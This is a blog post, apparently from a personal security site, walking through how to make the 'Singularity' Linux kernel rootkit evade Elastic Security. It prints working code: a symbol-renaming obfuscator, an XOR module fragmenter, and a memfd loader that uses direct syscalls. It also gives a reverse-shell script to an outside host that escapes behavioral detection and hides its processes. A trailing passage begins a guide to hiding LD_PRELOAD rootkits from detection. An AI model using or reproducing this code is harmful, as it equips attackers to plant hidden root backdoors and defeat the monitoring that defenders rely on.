r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end 